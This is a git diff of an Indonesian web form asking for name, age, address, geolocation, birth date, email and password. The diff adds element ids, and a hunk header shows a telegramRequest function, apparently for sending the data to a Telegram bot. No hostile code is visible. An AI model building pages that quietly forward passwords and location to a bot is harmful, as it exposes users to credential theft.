@@ -18,29 +18,29 @@
     <form id="form">
       <label data-id="2">Nama :</label>
       <br>
-      <input data-id="1" type="name" placeholder="Masukkan Nama" required></input>
+      <input data-id="1" id="nama" type="name" placeholder="Masukkan Nama" required></input>
       <br>
       <label data-id="2">Umur :</label>
       <br>
-      <input type="number" data-id="1" placeholder="Umur" required></input>
+      <input id="umur" type="number" data-id="1" placeholder="Umur" required></input>
       <br>
       <label data-id="2">Alamat :</label>
       <br>
-      <textarea data-id="1" placeholder="Masukkan Alamat / Dapatkan Lokasi Langsung" required></textarea>
+      <textarea id="lokasi" data-id="1" placeholder="Masukkan Alamat / Dapatkan Lokasi Langsung" required></textarea>
       <br>
       <button onclick="getLocation()">Dapatkan Lokasi</button>
       <br>
       <label data-id="2">Tanggal Lahir :</label>
       <br>
-      <input type="date" data-id="1" required></input>
+      <input id="tgl_lahir" type="date" data-id="1" required></input>
       <br>
       <label data-id="2">Email :</label>
       <br>
-      <input data-id="1" type="email" placeholder="Masukkan Email" required></input>
+      <input id="email" data-id="1" type="email" placeholder="Masukkan Email" required></input>
       <br>
       <label data-id="2">Kata Sandi :</label>
       <br>
-      <input type="password" data-id="1" placeholder="Masukkan Kata Sandi" required></input>
+      <input id="kata_sandi" type="password" data-id="1" placeholder="Masukkan Kata Sandi" required></input>
       <br>
       <input type="submit" onclick="sendText()"></input>
     
@@ -91,7 +91,7 @@ async function telegramRequest(method, data) {
 const form = document.getElementById('form');
 let tgl_lahir; // Deklarasikan variabel tgl_lahir di luar event listener
 
-var inputDate = document.getElementById("tgl_lahir");
+const inputDate = document.getElementById("tgl_lahir");
 inputDate.addEventListener("change", function() {
   var selectedDate = inputDate.value;
   var dateObject = new Date(selectedDate);
